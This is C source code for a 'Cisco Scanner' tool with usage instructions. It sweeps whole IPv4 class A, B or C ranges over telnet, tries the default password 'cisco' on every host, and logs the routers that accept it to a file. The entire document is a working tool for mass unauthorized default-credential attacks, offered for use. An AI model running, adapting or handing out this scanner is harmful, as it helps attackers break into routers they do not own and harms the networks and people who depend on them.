/* Cisco Scanner v1.3 - semi-final
Cisco Scanner will scan a class A, B or C range of
IP addresses for Cisco routers that haven't changed
their default password from "cisco" and store them in
cisco.txt.

Usage:
       Class A = ./ciscos 127 1
       Class B = ./ciscos 127.0 2
       Class C = ./ciscos 127.0.0 3

Optional:
          -t = timeout in seconds (3-5 seconds)
          -C = threads (300 or below is recommended)


                                          :: Ravi_C ::
                                         smolten@ureach.com
					



Soon: pure enable scanner plus more efficient threading

*/

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>
#include <errno.h>

#define SA struct sockaddr
#define SIN_LEN sizeof(struct sockaddr_in)
#define IPV4_ADDRLEN 16

void ShowHelp(char *, char *);
void ShowVer()
{
   printf("Cisco Scanner v1.3\n");
}
int ConnectCheck(struct sockaddr_in, int);

const char *ipv4_ntop(int, const void *, char *, size_t);
FILE *stream;

int main(int argc, char *argv[]) {
   int i=0,j=0,k=0,status,Children=105,Timeout=7,class=0;
   char DestIP[15],*NetworkID,c,*num3;
   struct sockaddr_in DestAddress;
   if(argc < 3) ShowHelp(argv[0], "");
   NetworkID = argv[1];
   num3=argv[2];
   class=atoi(num3);
   opterr = 0;
   while((c = getopt(argc, argv, "C:t:")) != -1) {
      switch(c) {
         case 'C': Children = atoi(optarg); break;
         case 't': Timeout = atoi(optarg); break;
         case '?': ShowHelp(argv[0], "ERROR: unrecognized option"); break;
      }
   }
   if(Children < 1) ShowHelp(argv[0], "ERROR: invalid number of children");
   if(Timeout < 1) ShowHelp(argv[0], "ERROR: invalid timeout");
   ShowVer();

/*Class A*/
   if (class==1)
   fprintf(stderr,
     "Scanning: %s.*.*.*\n output:cisco.txt\n threads:%i\n timeout:%i\n\n",
      NetworkID,Children,Timeout);

/*Class B*/
   if (class==2)
   fprintf(stderr,
     "Scanning: %s.*.*\n output:cisco.txt\n threads:%i\n timeout:%i\n\n",
      NetworkID,Children,Timeout);

/*Class C*/
   if (class==3)
   fprintf(stderr,
     "Scanning: %s.*\n output:cisco.txt\n threads:%i\n timeout:%i\n\n",
      NetworkID,Children,Timeout);

   DestAddress.sin_family = AF_INET;
   DestAddress.sin_port = htons(23);

/*Class A*/
  if (class==1){
for(k = 0; k < 256; k++) {
 for(j = 0; j < 256; j++) {
   for(i = 0; i < 256; i++) {
      if (i > Children || j > 0 || k > 0 ){
        wait(&status);
                       }
      sprintf(DestIP, "%s.%d.%d.%d", NetworkID,k,j,i);
      inet_aton(DestIP, &DestAddress.sin_addr);
      if(!fork()) ConnectCheck(DestAddress, Timeout);
   }
  }
 }
}

/*Class B*/
   if (class==2){
   for(j = 0; j < 256; j++) {
   for(i = 0; i < 256; i++) {
      if (i > Children || j > 0){
        wait(&status);
                       }
      sprintf(DestIP, "%s.%d.%d", NetworkID,j,i);
      inet_aton(DestIP, &DestAddress.sin_addr);
      if(!fork()) ConnectCheck(DestAddress, Timeout);
   }
  }
 }

/*Class C*/
 if (class==3){
   for(i = 0; i < 256; i++) {
      if (i > Children){
        wait(&status);
                       }
      sprintf(DestIP, "%s.%d", NetworkID, i);
      inet_aton(DestIP, &DestAddress.sin_addr);
      if(!fork()) ConnectCheck(DestAddress, Timeout);
   }
}

   for(;;) {
      if((waitpid(-1, &status, WNOHANG) == -1) && (errno == ECHILD))
            exit(EXIT_SUCCESS);
  }

}

int ConnectCheck(struct sockaddr_in DestAddr, int Timeout)
 {
   int result,ret,SocketFD;
   char Hostname[60],buffer1[64],buffer2[64];
   if((SocketFD = socket(AF_INET, SOCK_STREAM, 0)) < 0) exit (EXIT_FAILURE);
   alarm(Timeout);
   result = connect(SocketFD, (SA *)&DestAddr, SIN_LEN);
   if (!result) {
      alarm(Timeout);
         memset(buffer1, '\0', 64);
         memset(buffer2, '\0', 64);
        if ((ret = read(SocketFD, buffer1, 64))  > 0)
         {
            ret = read(SocketFD, buffer1, 64);
            send(SocketFD,"cisco\r",6,0);
            ret = read(SocketFD, buffer2, 64);

        if( (memcmp(buffer2,"\r\nPass",6)) &&
         !(memcmp(buffer1,
            "\r\n\r\nUser Access Verification\r\n\r\nPassword",40)))
  {
       stream = fopen("cisco.txt","a");
      printf("Cisco found: %s\n\a",
        ipv4_ntop(AF_INET,&DestAddr.sin_addr.s_addr,Hostname,59));
      fprintf(stream,"%s\n",
        ipv4_ntop(AF_INET,&DestAddr.sin_addr.s_addr,Hostname,59));
      fclose(stream);
        }}
      close(SocketFD);
  }

   exit(EXIT_SUCCESS);
}

const char *
ipv4_ntop(int family, const void *addrptr, char *strptr, size_t len) {
   const u_char *p = (const u_char *)addrptr;
   if(family == AF_INET) {
      char temp[IPV4_ADDRLEN];
      snprintf(temp, sizeof(temp), "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
      if(strlen(temp) >= len) {
         errno = ENOSPC;
         return(NULL);
      }
      strcpy(strptr, temp);
      return(strptr);
   }
   errno = EAFNOSUPPORT;
   return(NULL);
}


void ShowHelp(char *argv0, char *ErrMsg) {
   ShowVer();
   printf("  Output stored in cisco.txt\n");
   printf("  Usage: %s <IP> <class> [option]\n",argv0);
   printf("    Class A scan: ciscos 127 1 \n");
   printf("    Class B scan: ciscos 127.0 2 \n");
   printf("    Class C scan: ciscos 127.0.0 3\n");
   printf("    [-C <threads>] maximum threads\n");
   printf("    [-t <timeout>] seconds before connection timeout\n\n");
exit (EXIT_FAILURE);
}
